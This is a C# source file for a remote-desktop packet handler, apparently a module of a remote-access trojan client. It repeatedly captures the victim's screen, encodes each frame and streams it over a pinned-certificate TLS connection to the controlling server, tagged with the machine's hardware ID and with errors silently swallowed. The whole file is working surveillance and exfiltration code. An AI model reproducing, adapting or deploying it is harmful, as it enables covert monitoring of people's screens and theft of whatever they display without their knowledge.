using Client.MessagePack;
using Client.Sockets;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Net.Sockets;
using Client.Helper;
using System;
using Client.StreamLibrary.UnsafeCodecs;
using Client.StreamLibrary;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Security.Authentication;

namespace Client.Handle_Packet
{
   public class HandleRemoteDesktop
    {
        public void CaptureAndSend(int quality, int Scrn)
        {
            try
            {
                Socket Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    SendBufferSize = 50 * 1024,
                    ReceiveBufferSize = 50 * 1024,
                };
                Client.Connect(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(ClientSocket.Client.RemoteEndPoint.ToString().Split(':')[1]));

                SslStream SslClient = new SslStream(new NetworkStream(Client, true), false, ValidateServerCertificate);
                SslClient.AuthenticateAsClient(Client.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);

                string hwid = Methods.HWID();
                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
                while (Client.Connected)
                {
                    if (!ClientSocket.Client.Connected || !ClientSocket.IsConnected) break;
                    Bitmap bmp = GetScreen(Scrn);
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (MemoryStream stream = new MemoryStream(10000000))
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);
                        if (stream.Length > 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(System.Windows.Forms.Screen.AllScreens.Length);
                            SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                            SslClient.Write(msgpack.Encode2Bytes());
                            SslClient.Flush();
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
            }
            catch { }
        }

        private Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                gfxScreenshot.Dispose();
                return bmpScreenshot;
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }

        private bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
#if DEBUG
            return true;
#endif
            return Settings.ServerCertificate.Equals(certificate);
        }

    }
}
